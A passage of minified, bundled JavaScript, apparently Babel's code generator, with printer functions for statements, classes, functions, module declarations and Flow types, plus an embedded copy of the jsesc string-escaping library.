0;lO.ForStatement=$D1;lO.IfStatement=HD1;lO.LabeledStatement=ZD1;lO.ReturnStatement=BD1;lO.SwitchCase=OD1;lO.SwitchStatement=FD1;lO.ThrowStatement=qD1;lO.TryStatement=MD1;lO.VariableDeclaration=RD1;lO.VariableDeclarator=LD1;lO.WhileStatement=zD1;lO.WithStatement=GD1;var QD1=$0(),{isFor:mO,isForStatement:JD1,isIfStatement:YD1,isStatement:WD1}=QD1;function GD1(X){this.word("with"),this.space(),this.tokenChar(40),this.print(X.object),this.tokenChar(41),this.printBlock(X)}function HD1(X){this.word("if"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.space();let Q=X.alternate&&YD1(uO(X.consequent));if(Q)this.tokenChar(123),this.newline(),this.indent();if(this.printAndIndentOnComments(X.consequent),Q)this.dedent(),this.newline(),this.tokenChar(125);if(X.alternate){if(this.endsWith(125))this.space();this.word("else"),this.space(),this.printAndIndentOnComments(X.alternate)}}function uO(X){let{body:Q}=X;if(WD1(Q)===!1)return X;return uO(Q)}function $D1(X){this.word("for"),this.space(),this.tokenChar(40);{let Q=this.enterForStatementInit();this.print(X.init),Q()}if(this.tokenChar(59),X.test)this.space(),this.print(X.test);if(this.token(";",!1,1),X.update)this.space(),this.print(X.update);this.tokenChar(41),this.printBlock(X)}function zD1(X){this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.printBlock(X)}function cO(X){this.word("for"),this.space();let Q=X.type==="ForOfStatement";if(Q&&X.await)this.word("await"),this.space();this.noIndentInnerCommentsHere(),this.tokenChar(40);{let J=this.enterForXStatementInit(Q);this.print(X.left),J==null||J()}this.space(),this.word(Q?"of":"in"),this.space(),this.print(X.right),this.tokenChar(41),this.printBlock(X)}var QG0=lO.ForInStatement=cO,JG0=lO.ForOfStatement=cO;function UD1(X){this.word("do"),this.space(),this.print(X.body),this.space(),this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.semicolon()}function PY(X,Q){if(Q)X.space(),X.printTerminatorless(Q);X.semicolon()}function KD1(X){this.word("break"),PY(this,X.label)}function VD1(X){this.word("continue"),PY(this,X.label)}function BD1(X){this.word("return"),PY(this,X.argument)}function qD1(X){this.word("throw"),PY(this,X.argument)}function ZD1(X){this.print(X.label),this.tokenChar(58),this.space(),this.print(X.body)}function MD1(X){if(this.word("try"),this.space(),this.print(X.block),this.space(),X.handlers)this.print(X.handlers[0]);else this.print(X.handler);if(X.finalizer)this.space(),this.word("finally"),this.space(),this.print(X.finalizer)}function jD1(X){if(this.word("catch"),this.space(),X.param)this.tokenChar(40),this.print(X.param),this.print(X.param.typeAnnotation),this.tokenChar(41),this.space();this.print(X.body)}function FD1(X){this.word("switch"),this.space(),this.tokenChar(40),this.print(X.discriminant),this.tokenChar(41),this.space(),this.tokenChar(123),this.printSequence(X.cases,!0,void 0,function(J,Y){if(!J&&X.cases[X.cases.length-1]===Y)return-1}),this.rightBrace(X)}function OD1(X){if(X.test)this.word("case"),this.space(),this.print(X.test),this.tokenChar(58);else this.word("default"),this.tokenChar(58);if(X.consequent.length)this.newline(),this.printSequence(X.consequent,!0)}function AD1(){this.word("debugger"),this.semicolon()}function RD1(X,Q){if(X.declare)this.word("declare"),this.space();let{kind:J}=X;if(J==="await using")this.word("await"),this.space(),this.word("using",!0);else this.word(J,J==="using");this.space();let Y=!1;if(!mO(Q)){for(let W of X.declarations)if(W.init)Y=!0}if(this.printList(X.declarations,void 0,void 0,X.declarations.length>1,Y?function(W){this.token(",",!1,W),this.newline()}:void 0),mO(Q)){if(JD1(Q)){if(Q.init===X)return}else if(Q.left===X)return}this.semicolon()}function LD1(X){if(this.print(X.id),X.definite)this.tokenChar(33);if(this.print(X.id.typeAnnotation),X.init)this.space(),this.tokenChar(61),this.space(),this.print(X.init)}});var rO=m((iO)=>{Object.defineProperty(iO,"__esModule",{value:!0});iO.ClassAccessorProperty=rD1;iO.ClassBody=pD1;iO.ClassExpression=iO.ClassDeclaration=lD1;iO.ClassMethod=aD1;iO.ClassPrivateMethod=oD1;iO.ClassPrivateProperty=nD1;iO.ClassProperty=iD1;iO.StaticBlock=tD1;iO._classMethodHead=sD1;var mD1=$0(),{isExportDefaultDeclaration:uD1,isExportNamedDeclaration:cD1}=mD1;function lD1(X,Q){if(!(uD1(Q)||cD1(Q))||!this._shouldPrintDecoratorsBeforeExport(Q))this.printJoin(X.decorators);if(X.declare)this.word("declare"),this.space();if(X.abstract)this.word("abstract"),this.space();if(this.word("class"),X.id)this.space(),this.print(X.id);if(this.print(X.typeParameters),X.superClass)this.space(),this.word("extends"),this.space(),this.print(X.superClass),this.print(X.superTypeParameters);if(X.implements)this.space(),this.word("implements"),this.space(),this.printList(X.implements);this.space(),this.print(X.body)}function pD1(X){if(this.tokenChar(123),X.body.length===0)this.tokenChar(125);else{this.newline();let Q=dD1(this,X);Q==null||Q(-1);let J=this.enterDelimited();if(this.printJoin(X.body,!0,!0,Q,!0),J(),!this.endsWith(10))this.newline();this.rightBrace(X)}}function dD1(X,Q){if(!X.tokenMap||Q.start==null||Q.end==null)return null;let J=X.tokenMap.getIndexes(Q);if(!J)return null;let Y=1,W=0,G=0,H=()=>{while(G<Q.body.length&&Q.body[G].start==null)G++};return H(),($)=>{if(G<=$)G=$+1,H();let z=G===Q.body.length?Q.end:Q.body[G].start,U;while(Y<J.length&&X.tokenMap.matchesOriginal(U=X._tokens[J[Y]],";")&&U.start<z)X.token(";",void 0,W++),Y++}}function iD1(X){if(this.printJoin(X.decorators),!X.static&&!this.format.preserveFormat){var Q;let J=(Q=X.key.loc)==null||(Q=Q.end)==null?void 0:Q.line;if(J)this.catchUp(J)}if(this.tsPrintClassMemberModifiers(X),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function rD1(X){var Q;this.printJoin(X.decorators);let J=(Q=X.key.loc)==null||(Q=Q.end)==null?void 0:Q.line;if(J)this.catchUp(J);if(this.tsPrintClassMemberModifiers(X),this.word("accessor",!0),this.space(),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function nD1(X){if(this.printJoin(X.decorators),this.tsPrintClassMemberModifiers(X),this.print(X.key),X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function aD1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function oD1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function sD1(X){if(this.printJoin(X.decorators),!this.format.preserveFormat){var Q;let J=(Q=X.key.loc)==null||(Q=Q.end)==null?void 0:Q.line;if(J)this.catchUp(J)}this.tsPrintClassMemberModifiers(X),this._methodHead(X)}function tD1(X){if(this.word("static"),this.space(),this.tokenChar(123),X.body.length===0)this.tokenChar(125);else this.newline(),this.printSequence(X.body,!0),this.rightBrace(X)}});var aO=m((nO)=>{Object.defineProperty(nO,"__esModule",{value:!0});nO.ArrowFunctionExpression=ON1;nO.FunctionDeclaration=nO.FunctionExpression=FN1;nO._functionHead=jN1;nO._methodHead=ZN1;nO._param=qN1;nO._parameters=BN1;nO._params=VN1;nO._predicate=MN1;nO._shouldPrintArrowParamsParens=AN1;var zN1=$0(),UN1=Y7(),{isIdentifier:KN1}=zN1;function VN1(X,Q,J){this.print(X.typeParameters);let Y=RN1.call(this,Q,J);if(Y)this.sourceIdentifierName(Y.name,Y.pos);this.tokenChar(40),this._parameters(X.params,")");let W=X.type==="ArrowFunctionExpression";this.print(X.returnType,W),this._noLineTerminator=W}function BN1(X,Q){let J=this.enterDelimited(),Y=this.shouldPrintTrailingComma(Q),W=X.length;for(let G=0;G<W;G++)if(this._param(X[G]),Y||G<W-1)this.token(",",null,G),this.space();this.token(Q),J()}function qN1(X){if(this.printJoin(X.decorators),this.print(X),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function ZN1(X){let{kind:Q,key:J}=X;if(Q==="get"||Q==="set")this.word(Q),this.space();if(X.async)this.word("async",!0),this.space();if(Q==="method"||Q==="init"){if(X.generator)this.tokenChar(42)}if(X.computed)this.tokenChar(91),this.print(J),this.tokenChar(93);else this.print(J);if(X.optional)this.tokenChar(63);this._params(X,X.computed&&X.key.type!=="StringLiteral"?void 0:X.key,void 0)}function MN1(X,Q){if(X.predicate){if(!X.returnType)this.tokenChar(58);this.space(),this.print(X.predicate,Q)}}function jN1(X,Q){if(X.async){if(this.word("async"),!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.space()}if(this.word("function"),X.generator){if(!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.tokenChar(42)}if(this.space(),X.id)this.print(X.id);if(this._params(X,X.id,Q),X.type!=="TSDeclareFunction")this._predicate(X)}function FN1(X,Q){this._functionHead(X,Q),this.space(),this.print(X.body)}function ON1(X,Q){if(X.async)this.word("async",!0),this.space();if(this._shouldPrintArrowParamsParens(X))this._params(X,void 0,Q);else this.print(X.params[0],!0);this._predicate(X,!0),this.space(),this.printInnerComments(),this.token("=>"),this.space(),this.tokenContext|=UN1.TokenContext.arrowBody,this.print(X.body)}function AN1(X){var Q,J;if(X.params.length!==1)return!0;if(X.typeParameters||X.returnType||X.predicate)return!0;let Y=X.params[0];if(!KN1(Y)||Y.typeAnnotation||Y.optional||(Q=Y.leadingComments)!=null&&Q.length||(J=Y.trailingComments)!=null&&J.length)return!0;if(this.tokenMap){if(X.loc==null)return!0;if(this.tokenMap.findMatching(X,"(")!==null)return!0;let W=this.tokenMap.findMatching(X,"=>");if((W==null?void 0:W.loc)==null)return!0;return W.loc.start.line!==X.loc.start.line}if(this.format.retainLines)return!0;return!1}function RN1(X,Q){let J=X;if(!J&&Q){let z=Q.type;if(z==="VariableDeclarator")J=Q.id;else if(z==="AssignmentExpression"||z==="AssignmentPattern")J=Q.left;else if(z==="ObjectProperty"||z==="ClassProperty"){if(!Q.computed||Q.key.type==="StringLiteral")J=Q.key}else if(z==="ClassPrivateProperty"||z==="ClassAccessorProperty")J=Q.key}if(!J)return;let Y;if(J.type==="Identifier"){var W,G;Y={pos:(W=J.loc)==null?void 0:W.start,name:((G=J.loc)==null?void 0:G.identifierName)||J.name}}else if(J.type==="PrivateName"){var H;Y={pos:(H=J.loc)==null?void 0:H.start,name:"#"+J.id.name}}else if(J.type==="StringLiteral"){var $;Y={pos:($=J.loc)==null?void 0:$.start,name:J.value}}return Y}});var Kz=m((eO)=>{Object.defineProperty(eO,"__esModule",{value:!0});eO.ExportAllDeclaration=lN1;eO.ExportDefaultDeclaration=dN1;eO.ExportDefaultSpecifier=gN1;eO.ExportNamedDeclaration=pN1;eO.ExportNamespaceSpecifier=uN1;eO.ExportSpecifier=mN1;eO.ImportAttribute=rN1;eO.ImportDeclaration=iN1;eO.ImportDefaultSpecifier=yN1;eO.ImportExpression=aN1;eO.ImportNamespaceSpecifier=nN1;eO.ImportSpecifier=hN1;eO._printAttributes=cN1;var TN1=$0(),_N1=Y7(),{isClassDeclaration:kN1,isExportDefaultSpecifier:bN1,isExportNamespaceSpecifier:vN1,isImportDefaultSpecifier:xN1,isImportNamespaceSpecifier:fN1,isStatement:sO}=TN1;function hN1(X){if(X.importKind==="type"||X.importKind==="typeof")this.word(X.importKind),this.space();if(this.print(X.imported),X.local&&X.local.name!==X.imported.name)this.space(),this.word("as"),this.space(),this.print(X.local)}function yN1(X){this.print(X.local)}function gN1(X){this.print(X.exported)}function mN1(X){if(X.exportKind==="type")this.word("type"),this.space();if(this.print(X.local),X.exported&&X.local.name!==X.exported.name)this.space(),this.word("as"),this.space(),this.print(X.exported)}function uN1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.exported)}var oO=!1;function cN1(X,Q){var J;let{importAttributesKeyword:Y}=this.format,{attributes:W,assertions:G}=X;if(W&&!Y&&X.extra&&(X.extra.deprecatedAssertSyntax||X.extra.deprecatedWithLegacySyntax)&&!oO)oO=!0,console.warn('You are using import attributes, without specifying the desired output syntax.\nPlease specify the "importAttributesKeyword" generator option, whose value can be one of:\n - "with"        : `import { a } from "b" with { type: "json" };`\n - "assert"      : `import { a } from "b" assert { type: "json" };`\n - "with-legacy" : `import { a } from "b" with type: "json";`\n');let H=Y==="assert"||!Y&&G;if(this.word(H?"assert":"with"),this.space(),!H&&(Y==="with-legacy"||!Y&&(J=X.extra)!=null&&J.deprecatedWithLegacySyntax)){this.printList(W||G);return}let $=Q?1:0;this.token("{",null,$),this.space(),this.printList(W||G,this.shouldPrintTrailingComma("}")),this.space(),this.token("}",null,$)}function lN1(X){var Q,J;if(this.word("export"),this.space(),X.exportKind==="type")this.word("type"),this.space();if(this.tokenChar(42),this.space(),this.word("from"),this.space(),(Q=X.attributes)!=null&&Q.length||(J=X.assertions)!=null&&J.length)this.print(X.source,!0),this.space(),this._printAttributes(X,!1);else this.print(X.source);this.semicolon()}function tO(X,Q){if(kN1(Q.declaration)&&X._shouldPrintDecoratorsBeforeExport(Q))X.printJoin(Q.declaration.decorators)}function pN1(X){if(tO(this,X),this.word("export"),this.space(),X.declaration){let Y=X.declaration;if(this.print(Y),!sO(Y))this.semicolon()}else{if(X.exportKind==="type")this.word("type"),this.space();let Y=X.specifiers.slice(0),W=!1;for(;;){let H=Y[0];if(bN1(H)||vN1(H)){if(W=!0,this.print(Y.shift()),Y.length)this.tokenChar(44),this.space()}else break}let G=!1;if(Y.length||!Y.length&&!W){if(G=!0,this.tokenChar(123),Y.length)this.space(),this.printList(Y,this.shouldPrintTrailingComma("}")),this.space();this.tokenChar(125)}if(X.source){var Q,J;if(this.space(),this.word("from"),this.space(),(Q=X.attributes)!=null&&Q.length||(J=X.assertions)!=null&&J.length)this.print(X.source,!0),this.space(),this._printAttributes(X,G);else this.print(X.source)}this.semicolon()}}function dN1(X){tO(this,X),this.word("export"),this.noIndentInnerCommentsHere(),this.space(),this.word("default"),this.space(),this.tokenContext|=_N1.TokenContext.exportDefault;let Q=X.declaration;if(this.print(Q),!sO(Q))this.semicolon()}function iN1(X){var Q,J;this.word("import"),this.space();let Y=X.importKind==="type"||X.importKind==="typeof";if(Y)this.noIndentInnerCommentsHere(),this.word(X.importKind),this.space();else if(X.module)this.noIndentInnerCommentsHere(),this.word("module"),this.space();else if(X.phase)this.noIndentInnerCommentsHere(),this.word(X.phase),this.space();let W=X.specifiers.slice(0),G=!!W.length;while(G){let $=W[0];if(xN1($)||fN1($)){if(this.print(W.shift()),W.length)this.tokenChar(44),this.space()}else break}let H=!1;if(W.length)H=!0,this.tokenChar(123),this.space(),this.printList(W,this.shouldPrintTrailingComma("}")),this.space(),this.tokenChar(125);else if(Y&&!G)H=!0,this.tokenChar(123),this.tokenChar(125);if(G||Y)this.space(),this.word("from"),this.space();if((Q=X.attributes)!=null&&Q.length||(J=X.assertions)!=null&&J.length)this.print(X.source,!0),this.space(),this._printAttributes(X,H);else this.print(X.source);this.semicolon()}function rN1(X){this.print(X.key),this.tokenChar(58),this.space(),this.print(X.value)}function nN1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.local)}function aN1(X){if(this.word("import"),X.phase)this.tokenChar(46),this.word(X.phase);this.tokenChar(40);let Q=this.shouldPrintTrailingComma(")");if(this.print(X.source),X.options!=null)this.tokenChar(44),this.space(),this.print(X.options);if(Q)this.tokenChar(44);this.rightParens(X)}});var YA=m((UG0,JA)=>{var XA={},Uw1=XA.hasOwnProperty,QA=(X,Q)=>{for(let J in X)if(Uw1.call(X,J))Q(J,X[J])},Kw1=(X,Q)=>{if(!Q)return X;return QA(Q,(J,Y)=>{X[J]=Y}),X},Vw1=(X,Q)=>{let J=X.length,Y=-1;while(++Y<J)Q(X[Y])},SY=(X)=>{return"\\u"+("0000"+X).slice(-4)},XQ=(X,Q)=>{let J=X.toString(16);if(Q)return J;return J.toUpperCase()},QQ=XA.toString,Bw1=Array.isArray,qw1=(X)=>{return typeof Buffer==="function"&&Buffer.isBuffer(X)},Zw1=(X)=>{return QQ.call(X)=="[object Object]"},Mw1=(X)=>{return typeof X=="string"||QQ.call(X)=="[object String]"},jw1=(X)=>{return typeof X=="number"||QQ.call(X)=="[object Number]"},Vz=(X)=>{return typeof X=="bigint"},Fw1=(X)=>{return typeof X=="function"},Ow1=(X)=>{return QQ.call(X)=="[object Map]"},Aw1=(X)=>{return QQ.call(X)=="[object Set]"},Rw1={"\\":"\\\\","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t"},Lw1=/[\\\b\f\n\r\t]/,Dw1=/[0-9]/,Nw1=/[\xA0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000]/,ww1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^]/g,Iw1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^ !#-&\(-\[\]-_a-~]/g,FX=(X,Q)=>{let J=()=>{U=z,++Q.indentLevel,z=Q.indent.repeat(Q.indentLevel)},Y={escapeEverything:!1,minimal:!1,isScriptContext:!1,quotes:"single",wrap:!1,es6:!1,json:!1,compact:!0,lowercaseHex:!1,numbers:"decimal",indent:"\t",indentLevel:0,__inline1__:!1,__inline2__:!1},W=Q&&Q.json;if(W)Y.quotes="double",Y.wrap=!0;if(Q=Kw1(Y,Q),Q.quotes!="single"&&Q.quotes!="double"&&Q.quotes!="backtick")Q.quotes="single";let G=Q.quotes=="double"?'"':Q.quotes=="backtick"?"`":"'",H=Q.compact,$=Q.lowercaseHex,z=Q.indent.repeat(Q.indentLevel),U="",K=Q.__inline1__,B=Q.__inline2__,q=H?"":`
`,Z,M=!0,L=Q.numbers=="binary",R=Q.numbers=="octal",j=Q.numbers=="decimal",F=Q.numbers=="hexadecimal";if(W&&X&&Fw1(X.toJSON))X=X.toJSON();if(!Mw1(X)){if(Ow1(X)){if(X.size==0)return"new Map()";if(!H)Q.__inline1__=!0,Q.__inline2__=!1;return"new Map("+FX(Array.from(X),Q)+")"}if(Aw1(X)){if(X.size==0)return"new Set()";return"new Set("+FX(Array.from(X),Q)+")"}if(qw1(X)){if(X.length==0)return"Buffer.from([])";return"Buffer.from("+FX(Array.from(X),Q)+")"}if(Bw1(X)){if(Z=[],Q.wrap=!0,K)Q.__inline1__=!1,Q.__inline2__=!0;if(!B)J();if(Vw1(X,(O)=>{if(M=!1,B)Q.__inline2__=!1;Z.push((H||B?"":z)+FX(O,Q))}),M)return"[]";if(B)return"["+Z.join(", ")+"]";return"["+q+Z.join(","+q)+q+(H?"":U)+"]"}else if(jw1(X)||Vz(X)){if(W)return JSON.stringify(Number(X));let O;if(j)O=String(X);else if(F){let w=X.toString(16);if(!$)w=w.toUpperCase();O="0x"+w}else if(L)O="0b"+X.toString(2);else if(R)O="0o"+X.toString(8);if(Vz(X))return O+"n";return O}else if(Vz(X)){if(W)return JSON.stringify(Number(X));return X+"n"}else if(!Zw1(X)){if(W)return JSON.stringify(X)||"null";return String(X)}else{if(Z=[],Q.wrap=!0,J(),QA(X,(O,w)=>{M=!1,Z.push((H?"":z)+FX(O,Q)+":"+(H?"":" ")+FX(w,Q))}),M)return"{}";return"{"+q+Z.join(","+q)+q+(H?"":U)+"}"}}let A=Q.escapeEverything?ww1:Iw1;if(Z=X.replace(A,(O,w,N,C,_,h)=>{if(w){if(Q.minimal)return w;let p=w.charCodeAt(0),e=w.charCodeAt(1);if(Q.es6){let d=(p-55296)*1024+e-56320+65536;return"\\u{"+XQ(d,$)+"}"}return SY(XQ(p,$))+SY(XQ(e,$))}if(N)return SY(XQ(N.charCodeAt(0),$));if(O=="\x00"&&!W&&!Dw1.test(h.charAt(_+1)))return"\\0";if(C){if(C==G||Q.escapeEverything)return"\\"+C;return C}if(Lw1.test(O))return Rw1[O];if(Q.minimal&&!Nw1.test(O))return O;let o=XQ(O.charCodeAt(0),$);if(W||o.length>2)return SY(o);return"\\x"+("00"+o).slice(-2)}),G=="`")Z=Z.replace(/\$\{/g,"\\${");if(Q.isScriptContext)Z=Z.replace(/<\/(script|style)/gi,"<\\/$1").replace(/<!--/g,W?"\\u003C!--":"\\x3C!--");if(Q.wrap)Z=G+Z+G;return Z};FX.version="3.0.2";JA.exports=FX});var qz=m(($A)=>{Object.defineProperty($A,"__esModule",{value:!0});$A.ArgumentPlaceholder=Tw1;$A.ArrayPattern=$A.ArrayExpression=xw1;$A.BigIntLiteral=lw1;$A.BooleanLiteral=gw1;$A.Identifier=Ew1;$A.NullLiteral=mw1;$A.NumericLiteral=uw1;$A.ObjectPattern=$A.ObjectExpression=kw1;$A.ObjectMethod=bw1;$A.ObjectProperty=vw1;$A.PipelineBareFunction=iw1;$A.PipelinePrimaryTopicReference=rw1;$A.PipelineTopicExpression=dw1;$A.RecordExpression=fw1;$A.RegExpLiteral=yw1;$A.SpreadElement=$A.RestElement=_w1;$A.StringLiteral=cw1;$A.TopicReference=pw1;$A.TupleExpression=hw1;$A.VoidPattern=nw1;$A._getRawIdentifier=Sw1;var Cw1=$0(),HA=YA(),{isAssignmentPattern:Pw1,isIdentifier:Bz}=Cw1,WA=null,EY="";function Sw1(X){if(X===WA)return EY;WA=X;let{name:Q}=X,J=this.tokenMap.find(X,(Y)=>Y.value===Q);if(J)return EY=this._originalCode.slice(J.start,J.end),EY;return EY=X.name}function Ew1(X){var Q;this.sourceIdentifierName(((Q=X.loc)==null?void 0:Q.identifierName)||X.name),this.word(this.tokenMap?this._getRawIdentifier(X):X.name)}function Tw1(){this.tokenChar(63)}function _w1(X){this.token("..."),this.print(X.argument)}function kw1(X){let Q=X.properties;if(this.tokenChar(123),Q.length){let J=this.enterDelimited();this.space(),this.printList(Q,this.shouldPrintTrailingComma("}"),!0,!0),this.space(),J()}this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}function bw1(X){this.printJoin(X.decorators),this._methodHead(X),this.space(),this.print(X.body)}function vw1(X){if(this.printJoin(X.decorators),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else{if(Pw1(X.value)&&Bz(X.key)&&X.key.name===X.value.left.name){this.print(X.value);return}if(this.print(X.key),X.shorthand&&Bz(X.key)&&Bz(X.value)&&X.key.name===X.value.name)return}this.tokenChar(58),this.space(),this.print(X.value)}function xw1(X){let Q=X.elements,J=Q.length;this.tokenChar(91);let Y=this.enterDelimited();for(let W=0;W<Q.length;W++){let G=Q[W];if(G){if(W>0)this.space();if(this.print(G),W<J-1||this.shouldPrintTrailingComma("]"))this.token(",",!1,W)}else this.token(",",!1,W)}Y(),this.tokenChar(93)}function fw1(X){let Q=X.properties,J,Y;if(this.format.recordAndTupleSyntaxType==="bar")J="{|",Y="|}";else if(this.format.recordAndTupleSyntaxType!=="hash"&&this.format.recordAndTupleSyntaxType!=null)throw Error(`The "recordAndTupleSyntaxType" generator option must be "bar" or "hash" (${JSON.stringify(this.format.recordAndTupleSyntaxType)} received).`);else J="#{",Y="}";if(this.token(J),Q.length)this.space(),this.printList(Q,this.shouldPrintTrailingComma(Y),!0,!0),this.space();this.token(Y)}function hw1(X){let Q=X.elements,J=Q.length,Y,W;if(this.format.recordAndTupleSyntaxType==="bar")Y="[|",W="|]";else if(this.format.recordAndTupleSyntaxType==="hash")Y="#[",W="]";else throw Error(`${this.format.recordAndTupleSyntaxType} is not a valid recordAndTuple syntax type`);this.token(Y);for(let G=0;G<Q.length;G++){let H=Q[G];if(H){if(G>0)this.space();if(this.print(H),G<J-1||this.shouldPrintTrailingComma(W))this.token(",",!1,G)}}this.token(W)}function yw1(X){this.word(`/${X.pattern}/${X.flags}`)}function gw1(X){this.word(X.value?"true":"false")}function mw1(){this.word("null")}function uw1(X){let Q=this.getPossibleRaw(X),J=this.format.jsescOption,Y=X.value,W=Y+"";if(J.numbers)this.number(HA(Y,J),Y);else if(Q==null)this.number(W,Y);else if(this.format.minified)this.number(Q.length<W.length?Q:W,Y);else this.number(Q,Y)}function cw1(X){let Q=this.getPossibleRaw(X);if(!this.format.minified&&Q!==void 0){this.token(Q);return}let J=HA(X.value,this.format.jsescOption);this.token(J)}function lw1(X){let Q=this.getPossibleRaw(X);if(!this.format.minified&&Q!==void 0){this.word(Q);return}this.word(X.value+"n")}var GA=new Set(["^^","@@","^","%","#"]);function pw1(){let{topicToken:X}=this.format;if(GA.has(X))this.token(X);else{let Q=JSON.stringify(X),J=Array.from(GA,(Y)=>JSON.stringify(Y));throw Error(`The "topicToken" generator option must be one of ${J.join(", ")} (${Q} received instead).`)}}function dw1(X){this.print(X.expression)}function iw1(X){this.print(X.callee)}function rw1(){this.tokenChar(35)}function nw1(){this.word("void")}});var UA=m((bY)=>{Object.defineProperty(bY,"__esModule",{value:!0});bY.AnyTypeAnnotation=RI1;bY.ArrayTypeAnnotation=LI1;bY.BooleanLiteralTypeAnnotation=NI1;bY.BooleanTypeAnnotation=DI1;bY.DeclareClass=II1;bY.DeclareExportAllDeclaration=fI1;bY.DeclareExportDeclaration=xI1;bY.DeclareFunction=CI1;bY.DeclareInterface=EI1;bY.DeclareModule=TI1;bY.DeclareModuleExports=_I1;bY.DeclareOpaqueType=bI1;bY.DeclareTypeAlias=kI1;bY.DeclareVariable=vI1;bY.DeclaredPredicate=SI1;bY.EmptyTypeAnnotation=WC1;bY.EnumBooleanBody=yI1;bY.EnumBooleanMember=lI1;bY.EnumDeclaration=hI1;bY.EnumDefaultedMember=cI1;bY.EnumNumberBody=gI1;bY.EnumNumberMember=pI1;bY.EnumStringBody=mI1;bY.EnumStringMember=dI1;bY.EnumSymbolBody=uI1;bY.ExistsTypeAnnotation=rI1;bY.FunctionTypeAnnotation=nI1;bY.FunctionTypeParam=aI1;bY.IndexedAccessType=EC1;bY.InferredPredicate=PI1;bY.InterfaceDeclaration=eI1;bY.GenericTypeAnnotation=bY.ClassImplements=bY.InterfaceExtends=oI1;bY.InterfaceTypeAnnotation=QC1;bY.IntersectionTypeAnnotation=JC1;bY.MixedTypeAnnotation=YC1;bY.NullLiteralTypeAnnotation=wI1;bY.NullableTypeAnnotation=GC1;Object.defineProperty(bY,"NumberLiteralTypeAnnotation",{enumerable:!0,get:function(){return zA.NumericLiteral}});bY.NumberTypeAnnotation=HC1;bY.ObjectTypeAnnotation=jC1;bY.ObjectTypeCallProperty=OC1;bY.ObjectTypeIndexer=AC1;bY.ObjectTypeInternalSlot=FC1;bY.ObjectTypeProperty=RC1;bY.ObjectTypeSpreadProperty=LC1;bY.OpaqueType=MC1;bY.OptionalIndexedAccessType=TC1;bY.QualifiedTypeIdentifier=DC1;Object.defineProperty(bY,"StringLiteralTypeAnnotation",{enumerable:!0,get:function(){return zA.StringLiteral}});bY.StringTypeAnnotation=$C1;bY.SymbolTypeAnnotation=NC1;bY.ThisTypeAnnotation=zC1;bY.TupleTypeAnnotation=UC1;bY.TypeAlias=VC1;bY.TypeAnnotation=BC1;bY.TypeCastExpression=CC1;bY.TypeParameter=ZC1;bY.TypeParameterDeclaration=bY.TypeParameterInstantiation=qC1;bY.TypeofTypeAnnotation=KC1;bY.UnionTypeAnnotation=IC1;bY.Variance=PC1;bY.VoidTypeAnnotation=SC1;bY._interfaceish=sI1;bY._variance=tI1;var jI1=$0(),FI1=Kz(),OI1=Y7(),zA=qz(),{isDeclareExportDeclaration:TY,isStatement:AI1}=jI1;function RI1(){this.word("any")}function LI1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function DI1(){this.word("boolean")}function NI1(X){this.word(X.value?"true":"false")}function wI1(){this.word("null")}function II1(X,Q){if(!TY(Q))this.word("declare"),this.space();this.word("class"),this.space(),this._interfaceish(X)}function CI1(X,Q){if(!TY(Q))this.word("declare"),this.space();if(this.word("function"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation.typeAnnotation),X.predicate)this.space(),this.print(X.predicate);this.semicolon()}function PI1(){this.tokenChar(37),this.word("checks")}function SI1(X){this.tokenChar(37),this.word("checks"),this.tokenChar(40),this.print(X.value),this.tokenChar(41)}function EI1(X){this.word("declare"),this.space(),this.InterfaceDeclaration(X)}function TI1(X){this.word("declare"),this.space(),this.word("module"),this.space(),this.print(X.id),this.space(),this.print(X.body)}function _I1(X){this.word("declare"),this.space(),this.word("module"),this.tokenChar(46),this.word("exports"),this.print(X.typeAnnotation)}function kI1(X){this.word("declare"),this.space(),this.TypeAlias(X)}function bI1(X,Q){if(!TY(Q))this.word("declare"),this.space();this.OpaqueType(X)}function vI1(X,Q){if(!TY(Q))this.word("declare"),this.space();this.word("var"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation),this.semicolon()}function xI1(X){if(this.word("declare"),this.space(),this.word("export"),this.space(),X.default)this.word("default"),this.space();iI1.call(this,X)}function fI1(X){this.word("declare"),this.space(),FI1.ExportAllDeclaration.call(this,X)}function hI1(X){let{id:Q,body:J}=X;this.word("enum"),this.space(),this.print(Q),this.print(J)}function _Y(X,Q,J){if(J)X.space(),X.word("of"),X.space(),X.word(Q);X.space()}function kY(X,Q){let{members:J}=Q;X.token("{"),X.indent(),X.newline();for(let Y of J)X.print(Y),X.newline();if(Q.hasUnknownMembers)X.token("..."),X.newline();X.dedent(),X.token("}")}function yI1(X){let{explicitType:Q}=X;_Y(this,"boolean",Q),kY(this,X)}function gI1(X){let{explicitType:Q}=X;_Y(this,"number",Q),kY(this,X)}function 